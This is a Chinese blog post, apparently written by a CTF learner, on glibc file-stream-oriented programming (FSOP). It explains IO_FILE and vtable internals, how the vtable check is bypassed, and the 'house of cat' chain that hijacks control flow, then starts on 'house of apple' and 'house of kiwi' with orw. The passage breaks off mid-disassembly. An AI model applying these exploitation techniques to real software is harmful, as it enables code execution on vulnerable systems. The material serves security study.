    <content type="html"><![CDATA[<p>crypto卷不动了，来学一下pwn (x)</p><h1 id="FSOP"><a href="#FSOP" class="headerlink" title="FSOP"></a>FSOP</h1><p>FSOP即<code>File Stream Oriented Programming</code> ,是一种针对IO_FILE结构体以及一些IO操作的一种攻击方式，在整理FSOP之前先介绍一下IO_FILE结构体</p><h2 id="IO-FILE等结构体介绍"><a href="#IO-FILE等结构体介绍" class="headerlink" title="IO_FILE等结构体介绍"></a>IO_FILE等结构体介绍</h2><p>先给出IO_FILE结构体的定义</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> &#123;</span></span><br><span class="line">  <span class="keyword">int</span> _flags;       <span class="comment">/* High-order word is _IO_MAGIC; rest is flags. */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _IO_file_flags _flags</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* The following pointers correspond to the C++ streambuf protocol. */</span></span><br><span class="line">  <span class="comment">/* Note:  Tk uses the _IO_read_ptr and _IO_read_end fields directly. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_read_ptr;   <span class="comment">/* Current read pointer */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_read_end;   <span class="comment">/* End of get area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_read_base;  <span class="comment">/* Start of putback+get area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_write_base; <span class="comment">/* Start of put area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_write_ptr;  <span class="comment">/* Current put pointer. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_write_end;  <span class="comment">/* End of put area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_buf_base;   <span class="comment">/* Start of reserve area. */</span></span><br><span class="line">  <span class="keyword">char</span>* _IO_buf_end;    <span class="comment">/* End of reserve area. */</span></span><br><span class="line">  <span class="comment">/* The following fields are used to support backing up and undo. */</span></span><br><span class="line">  <span class="keyword">char</span> *_IO_save_base; <span class="comment">/* Pointer to start of non-current get area. */</span></span><br><span class="line">  <span class="keyword">char</span> *_IO_backup_base;  <span class="comment">/* Pointer to first valid character of backup area */</span></span><br><span class="line">  <span class="keyword">char</span> *_IO_save_end; <span class="comment">/* Pointer to end of non-current get area. */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_marker</span> *_<span class="title">markers</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> *_<span class="title">chain</span>;</span></span><br><span class="line">  <span class="keyword">int</span> _fileno;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> 0</span></span><br><span class="line">  <span class="keyword">int</span> _blksize;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line">  <span class="keyword">int</span> _flags2;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">  _IO_off_t _old_offset; <span class="comment">/* This used to be _offset but it&#x27;s too small.  */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __HAVE_COLUMN <span class="comment">/* temporary */</span></span></span><br><span class="line">  <span class="comment">/* 1+column number of pbase(); 0 is unknown. */</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">short</span> _cur_column;</span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">char</span> _vtable_offset;</span><br><span class="line">  <span class="keyword">char</span> _shortbuf[<span class="number">1</span>];</span><br><span class="line">  <span class="comment">/*  char* _save_gptr;  char* _save_egptr; */</span></span><br><span class="line">  _IO_lock_t *_lock;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> _IO_USE_OLD_IO_FILE</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE_plus</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  _IO_FILE file;</span><br><span class="line">  <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> *<span class="title">vtable</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE_complete</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> _<span class="title">file</span>;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> defined _G_IO_IO_FILE_VERSION &amp;&amp; _G_IO_IO_FILE_VERSION == 0x20001</span></span><br><span class="line">  _IO_off64_t _offset;</span><br><span class="line"><span class="meta"># <span class="meta-keyword">if</span> defined _LIBC || defined _GLIBCPP_USE_WCHAR_T</span></span><br><span class="line">  <span class="comment">/* Wide character stream stuff.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_codecvt</span> *_<span class="title">codecvt</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_wide_data</span> *_<span class="title">wide_data</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> *_<span class="title">freeres_list</span>;</span></span><br><span class="line">  <span class="keyword">void</span> *_freeres_buf;</span><br><span class="line"><span class="meta"># <span class="meta-keyword">else</span></span></span><br><span class="line">  <span class="keyword">void</span> *__pad1;</span><br><span class="line">  <span class="keyword">void</span> *__pad2;</span><br><span class="line">  <span class="keyword">void</span> *__pad3;</span><br><span class="line">  <span class="keyword">void</span> *__pad4;</span><br><span class="line">  <span class="keyword">size_t</span> __pad5;</span><br><span class="line">  <span class="keyword">int</span> _mode;</span><br><span class="line">  <span class="comment">/* Make sure we don&#x27;t get into trouble again.  */</span></span><br><span class="line">  <span class="keyword">char</span> _unused2[<span class="number">15</span> * <span class="keyword">sizeof</span> (<span class="keyword">int</span>) - <span class="number">4</span> * <span class="keyword">sizeof</span> (<span class="keyword">void</span> *) - <span class="keyword">sizeof</span> (<span class="keyword">size_t</span>)];</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>在C语言中，我们打开一个文件，返回一个文件指针就是这个，在我们进行文件读写或者其他之类的操作的时候就会用到它。另外在<code>libc</code>的范围中中有一个<code>_IO_list_all</code>定义如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">extern</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE_plus</span> *_<span class="title">IO_list_all</span>;</span></span><br></pre></td></tr></table></figure><p>它是一个指向<code>_IO_FILE_plus</code> 的指针，同时我们注意到结构体内有这么一个定义，一个指向下一个<code>_IO_FILE</code>结构体的指针(关于<code>_IO_FILE_plus、_IO_FILE、_IO_FILE_complete</code>等大致理解其的包含关系就行了，下文若无特殊说明不作区分)</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> *_<span class="title">chain</span>;</span></span><br></pre></td></tr></table></figure><p>那么实际上我们可以知道这些结构体实际上以链表的形式串在了一起</p><p>还有一个很重要的定义是这个,在<code>_IO_FILE_plus</code>里</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">const struct _IO_jump_t *vtable;</span><br></pre></td></tr></table></figure><p>这是一个指向<code>_IO_jump_t</code>的指针，关于这个结构题我个人是理解成一个存有很多函数地址的一个函数表</p><h2 id="FSOP的思想"><a href="#FSOP的思想" class="headerlink" title="FSOP的思想"></a>FSOP的思想</h2><p>通俗来说，FSOP是通过劫持<code>_IO_list_all</code>等，自己构造<code>IO_FILE</code>结构体，通过触发一些IO流(也即调用一些IO相关函数)来调用<code>vtable</code>中的函数。由于我们是自己构造的<code>_IO_FILE</code>结构体，所以也可以自己改写<code>vtable</code> (比如令其指向我们自己写的一张函数表)，然后调用自己想调用的函数。关于如何触发IO流，我目前知道的有如下几种</p><ul><li>程序中调用<code>exit</code>函数时</li><li>触发<code>__malloc_assert</code>时</li><li>从<code>main</code>函数中返回时</li><li><code>libc</code>中执行<code>abort</code>时 </li></ul><p>最后一种在高版本libc中被删去了，所以主要是前面几种。主要利用了如下函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span></span><br><span class="line">_IO_flush_all_lockp (<span class="keyword">int</span> do_lock)</span><br><span class="line">&#123;</span><br><span class="line">  ...</span><br><span class="line">  fp = (_IO_FILE *) _IO_list_all;</span><br><span class="line">  <span class="keyword">while</span> (fp != <span class="literal">NULL</span>)</span><br><span class="line">  &#123;</span><br><span class="line">       ...</span><br><span class="line">       <span class="keyword">if</span> (((fp-&gt;_mode &lt;= <span class="number">0</span> &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base))</span><br><span class="line">               &amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF)</span><br><span class="line">           &#123;</span><br><span class="line">               result = EOF;</span><br><span class="line">          &#125;</span><br><span class="line">        ...</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>以调用<code>exit</code>函数为例，在其函数调用链中会调用<code>_IO_flush_all_lockp</code> ，当满足一定条件的时候，会调用<code>_IO_OVERFLOW</code>函数，而这个函数是<code>vtable</code>表中的某一项，所以当我们劫持修改<code>vtable</code>指针,使其指向我们构造的函数表，就能成功执行我们想要的函数(调用<code>_IO_OVERFLOW</code>时实际上调用的是我们构造函数表中的函数。而所提到的一定条件，根据短路原则我们可以知道既是这个条件(只有前面为真才执行<code>&amp;&amp;</code>后面的表达式)</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fp-&gt;_mode &lt;= <span class="number">0</span> &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base</span><br></pre></td></tr></table></figure><p>而如果我们能自己构造<code>IO_FILE</code>结构体，那么要满足这个条件实际上自己调整一下就行了。</p><h2 id="高版本下的检测以及利用思路"><a href="#高版本下的检测以及利用思路" class="headerlink" title="高版本下的检测以及利用思路"></a>高版本下的检测以及利用思路</h2><p>刚刚提到，我们只要修改<code>vtable</code> 指针指向构造的函数表，然后触发IO流就能调用相应函数。然而这个方法只有在<code>glibc2.24</code>之前有用,在此之后增加了对<code>vtable</code>指针的如下检测</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> *</span></span><br><span class="line"><span class="class"><span class="title">IO_validate_vtable</span> (<span class="title">const</span> <span class="title">struct</span> _<span class="title">IO_jump_t</span> *<span class="title">vtable</span>)</span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="keyword">uintptr_t</span> section_length = __stop___libc_IO_vtables - __start___libc_IO_vtables;</span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *ptr = (<span class="keyword">const</span> <span class="keyword">char</span> *) vtable;</span><br><span class="line">  <span class="keyword">uintptr_t</span> offset = ptr - __start___libc_IO_vtables;</span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (offset &gt;= section_length))</span><br><span class="line">    _IO_vtable_check ();</span><br><span class="line">  <span class="keyword">return</span> vtable;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>解读上述代码可知，这个检测实际上就是检测<code>vtable</code>是否在<code>__start___libc_IO_vtables</code>和<code>__stop___libc_IO_vtables</code>之间，如果不在的话就触发<code>_IO_vtable_check</code>进行进一步检测。所以我们按照老思路把<code>vtable</code>改成指向堆上的指针然后在堆上自己写函数表的方法就不行了。但是事实上这个检测还是比较松，我们可以修改<code>vtable</code>使我们调用<code>__start___libc_IO_vtables</code>和<code>__stop___libc_IO_vtables</code>之间的函数表的函数，只要相应函数有类似调用和<code>IO_FILE</code>结构相关的函数之类的操作就能进一步利用，当然这些利用相应的也需要绕过一些检测</p><h1 id="house-of-cat"><a href="#house-of-cat" class="headerlink" title="house of cat"></a>house of cat</h1><p><code>house of cat</code>是最近强网杯的一道题，是一位师傅提出的一条IO利用链(原文链接在</p><p>)前面说到，在高版本中由于对<code>vtable</code>的检测，使得我们就算劫持该表调用其他函数也只能调用在上述<code>libc_IO_vtables</code>之间的函数表中的函数，其中有这么一个<code>_IO_JUMP_t</code>可以供我们利用</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> _<span class="title">IO_wfile_jumps</span> <span class="title">libio_vtable</span> =</span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  JUMP_INIT_DUMMY,</span><br><span class="line">  JUMP_INIT(finish, _IO_new_file_finish),</span><br><span class="line">  JUMP_INIT(overflow, (_IO_overflow_t) _IO_wfile_overflow),</span><br><span class="line">  JUMP_INIT(underflow, (_IO_underflow_t) _IO_wfile_underflow),</span><br><span class="line">  JUMP_INIT(uflow, (_IO_underflow_t) _IO_wdefault_uflow),</span><br><span class="line">  JUMP_INIT(pbackfail, (_IO_pbackfail_t) _IO_wdefault_pbackfail),</span><br><span class="line">  JUMP_INIT(xsputn, _IO_wfile_xsputn),</span><br><span class="line">  JUMP_INIT(xsgetn, _IO_file_xsgetn),</span><br><span class="line">  JUMP_INIT(seekoff, _IO_wfile_seekoff),<span class="comment">//look at me</span></span><br><span class="line">  JUMP_INIT(seekpos, _IO_default_seekpos),</span><br><span class="line">  JUMP_INIT(setbuf, _IO_new_file_setbuf),</span><br><span class="line">  JUMP_INIT(sync, (_IO_sync_t) _IO_wfile_sync),</span><br><span class="line">  JUMP_INIT(doallocate, _IO_wfile_doallocate),</span><br><span class="line">  JUMP_INIT(read, _IO_file_read),</span><br><span class="line">  JUMP_INIT(write, _IO_new_file_write),</span><br><span class="line">  JUMP_INIT(seek, _IO_file_seek),</span><br><span class="line">  JUMP_INIT(close, _IO_file_close),</span><br><span class="line">  JUMP_INIT(stat, _IO_file_stat),</span><br><span class="line">  JUMP_INIT(showmanyc, _IO_default_showmanyc),</span><br><span class="line">  JUMP_INIT(imbue, _IO_default_imbue)</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>我们可以考察其中一个函数叫做<code>_IO_wfile_seekoff</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">off64_t</span></span><br><span class="line">_IO_wfile_seekoff (FILE *fp, <span class="keyword">off64_t</span> offset, <span class="keyword">int</span> dir, <span class="keyword">int</span> mode)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">off64_t</span> result;</span><br><span class="line">  <span class="keyword">off64_t</span> delta, new_offset;</span><br><span class="line">  <span class="keyword">long</span> <span class="keyword">int</span> count;</span><br><span class="line"> </span><br><span class="line">  <span class="keyword">if</span> (mode == <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> do_ftell_wide (fp);</span><br><span class="line">  <span class="keyword">int</span> must_be_exact = ((fp-&gt;_wide_data-&gt;_IO_read_base</span><br><span class="line">            == fp-&gt;_wide_data-&gt;_IO_read_end)</span><br><span class="line">               &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_base</span><br><span class="line">               == fp-&gt;_wide_data-&gt;_IO_write_ptr));</span><br><span class="line">#需要绕过was_writing的检测</span><br><span class="line">  <span class="keyword">bool</span> was_writing = ((fp-&gt;_wide_data-&gt;_IO_write_ptr</span><br><span class="line">               &gt; fp-&gt;_wide_data-&gt;_IO_write_base)</span><br><span class="line">              || _IO_in_put_mode (fp));</span><br><span class="line"> </span><br><span class="line">  <span class="keyword">if</span> (was_writing &amp;&amp; _IO_switch_to_wget_mode (fp))</span><br><span class="line">    <span class="keyword">return</span> WEOF;</span><br><span class="line">......</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们的目的是调用<code>_IO_switch_to_wget_mode</code> 。我们先梳理如何才能调用它，然后阐述为什么调用它</p><p>首先是如何调用它，显然我们这里需要绕过两个判断，一个是<code>mode != 0</code> (注意这个<code>mode</code>不是<code>IO_FILE</code>结构体当中的<code>_mode</code> ，一个是<code>was_writing==1</code> 。后者很好绕过，因为我们是自己伪造的<code>FILE</code>结构体，我们只要根据判断调整其中的数据，使得<code>fp-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_write_base</code>成立就行了。这里补充一下关于<code>_wide_data</code>结构体的定义如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_wide_data</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="keyword">wchar_t</span> *_IO_read_ptr;    <span class="comment">/* Current read pointer */</span></span><br><span class="line">  <span class="keyword">wchar_t</span> *_IO_read_end;    <span class="comment">/* End of get area. */</span></span><br><span class="line">  <span class="keyword">wchar_t</span> *_IO_read_base;    <span class="comment">/* Start of putback+get area. */</span></span><br><span class="line">  <span class="keyword">wchar_t</span> *_IO_write_base;    <span class="comment">/* Start of put area. */</span></span><br><span class="line">  <span class="keyword">wchar_t</span> *_IO_write_ptr;    <span class="comment">/* Current put pointer. */</span></span><br><span class="line">  <span class="keyword">wchar_t</span> *_IO_write_end;    <span class="comment">/* End of put area. */</span></span><br><span class="line">  <span class="keyword">wchar_t</span> *_IO_buf_base;    <span class="comment">/* Start of reserve area. */</span></span><br><span class="line">  <span class="keyword">wchar_t</span> *_IO_buf_end;        <span class="comment">/* End of reserve area. */</span></span><br><span class="line">  <span class="comment">/* The following fields are used to support backing up and undo. */</span></span><br><span class="line">  <span class="keyword">wchar_t</span> *_IO_save_base;    <span class="comment">/* Pointer to start of non-current get area. */</span></span><br><span class="line">  <span class="keyword">wchar_t</span> *_IO_backup_base;    <span class="comment">/* Pointer to first valid character of</span></span><br><span class="line"><span class="comment">                   backup area */</span></span><br><span class="line">  <span class="keyword">wchar_t</span> *_IO_save_end;    <span class="comment">/* Pointer to end of non-current get area. */</span></span><br><span class="line"> </span><br><span class="line">  <span class="keyword">__mbstate_t</span> _IO_state;</span><br><span class="line">  <span class="keyword">__mbstate_t</span> _IO_last_state;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_codecvt</span> _<span class="title">codecvt</span>;</span></span><br><span class="line">  <span class="keyword">wchar_t</span> _shortbuf[<span class="number">1</span>];</span><br><span class="line">  <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> *_<span class="title">wide_vtable</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>有关这个结构体我们后面在<code>house of apple</code>中也会提到。显然我们将<code>_wide_data</code>干脆写成伪造的<code>FILE</code>附近的指针，然后根据偏移将相应的数据调整一下就行了</p><p>前者实际上是要求我们能控制<code>rcx</code>寄存器，在跟进调试的时候可以发现在执行<code>_IO_wfile_seekoff</code>当<code>mode==0</code>执行另外一个函数的时候有如下操作</p><p><img src="https://s2.loli.net/2022/09/08/jnkcfta7MXNK6du.png" alt="mode.png"></p><p>我们看到会将<code>rax+0x18</code>地址处的值写入<code>rcx</code> ,然后还会有<code>rcx</code>与<code>rax+0x20</code>地址处的值进行比较然后跳转的操作。这里事实上我们可以发现这个<code>rax</code>实际上是和我们的堆地址相关的(这里的<code>rax</code>在上一步命令被置为<code>r15+0xa0</code>地址处的值，而<code>r15</code>实际上是一个我们伪造的指向<code>IO_FILE</code>的指针)所以我们保证跳转不变的情况下，在相应的地址上写上我们想给<code>rcx</code>置的值就行了</p><p>这里多说明一下，我自己测试的时候修改<code>IO_list_all</code>指向伪造的<code>FILE_1</code> 然后它的<code>_chain</code>指向了<code>FILE_2</code>(这两个FILE是相邻的，第一个的<code>flag</code>值(回顾IO_FILE结构，第一个就是flag)为0,第二个<code>flag</code>值为<code>&#39;/bin/sh&#39;</code> ),我一开始没怎么成功就是因为这个mode的判断导致进不去<code>_IO_switch_to_wget_mode</code>，并且相邻两次对<code>FILE</code>结构体的进行的<code>vtable</code>函数相关操作也没有对<code>rcx</code>赋值，然后我单步调试发现一个可利用的写<code>rcx</code>的指令。这个指令在相邻的两个<code>_IO_wfile_seekoff</code>之间(如果我们把两个<code>FILE</code>结构体的<code>vtable</code>指针改成一致的话，对这两个的<code>_IO_flush_all_lockp</code>最终都调用这个函数)，所以如果我们遇到不能满足<code>rcx != 0</code>情况的话，我个人的做法是再弄个<code>FILE</code>结构体，然后在<code>_IO_flush_all_lockp</code>第二个结构体的时候<code>rcx</code>寄存器就置好了，进而进入相应分支，进入<code>_IO_switch_to_wget_mode</code></p><p>然后我们再说明为什么要调用<code>_IO_switch_to_wget_mode</code>，其实在这个函数中间有如下指令</p><p><img src="https://s2.loli.net/2022/09/08/szluRDVq34nrFWi.png" alt="QQ图片20220906213505.png"></p><p>也就是这些指令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">► 0x7fbbb9489d30 &lt;_IO_switch_to_wget_mode&gt;       endbr64</span><br><span class="line">  0x7fbbb9489d34 &lt;_IO_switch_to_wget_mode+4&gt;     mov    rax, qword ptr [rdi + 0xa0]</span><br><span class="line">  0x7fbbb9489d3b &lt;_IO_switch_to_wget_mode+11&gt;    push   rbx</span><br><span class="line">  0x7fbbb9489d3c &lt;_IO_switch_to_wget_mode+12&gt;    mov    rbx, rdi</span><br><span class="line">  0x7fbbb9489d3f &lt;_IO_switch_to_wget_mode+15&gt;    mov    rdx, qword ptr [rax + 0x20]</span><br><span class="line">  0x7fbbb9489d43 &lt;_IO_switch_to_wget_mode+19&gt;    cmp    rdx, qword ptr [rax + 0x18]</span><br><span class="line">  0x7fbbb9489d47 &lt;_IO_switch_to_wget_mode+23&gt;    jbe    _IO_switch_to_wget_mode+56                </span><br><span class="line">  0x7fbbb9489d49 &lt;_IO_switch_to_wget_mode+25&gt;    mov    rax, qword ptr [rax + 0xe0]</span><br><span class="line">  0x7fbbb9489d50 &lt;_IO_switch_to_wget_mode+32&gt;    mov    esi, 0xffffffff</span><br><span class="line">  0x7fbbb9489d55 &lt;_IO_switch_to_wget_mode+37&gt;    call   qword ptr [rax + 0x18]</span><br></pre></td></tr></table></figure><p>我们可以看见最后有一个调用指令<code>call   qword ptr [rax + 0x18]</code> ,而这个<code>rax</code>是由<code>rax, qword ptr [rax + 0xe0]</code>也就是前一个上一个<code>rax</code>传来，最后归根结底都是和<code>rdi</code>寄存器相关，调试可以发现，其实<code>rdi</code>寄存器指向的地址是一个堆地址(实际上就是我们伪造的结构体的首地址，也即<code>flag</code>位)，所以我们只要合理地构造<code>FILE</code>，就能劫持程序控制流</p><h1 id="house-of-apple"><a href="#house-of-apple" class="headerlink" title="house of apple"></a>house of apple</h1><p>house of apple使用的条件是</p><ul><li>程序从main函数返回，或者调用exit函数</li><li>泄露出heap地址和libc地址</li><li>使用largebin attack</li></ul><h1 id="house-of-kiwi"><a href="#house-of-kiwi" class="headerlink" title="house of kiwi"></a>house of kiwi</h1><p><code>house of kiwi</code>实际上是<code>house of emma</code>的前置，它提供了一个触发<code>IO</code>流的方法。</p><p>在CTF题中，会遇到一些加了沙盒的题目(下一篇准备研究一下关于沙盒类的题，然后整理一下)。加了沙盒之后可能会禁用一些系统调用(比如<code>execve</code>之类的)，导致我们无法得到服务器权限，但是我们可以利用<code>open+read+write</code>也就是俗称的<code>orw</code>，不得到shell也能把flag给读出来</p><h2 id="setcontext-与-orw"><a href="#setcontext-与-orw" class="headerlink" title="setcontext 与 orw"></a>setcontext 与 orw</h2><p>既然无法得到shell，我们希冀借助另外函数或代码实现我们的<code>orw</code>，最终我们找到的是如下这个叫<code>setcontext</code>的</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line">0x00007fa70ef04a30 &lt;+0&gt;:     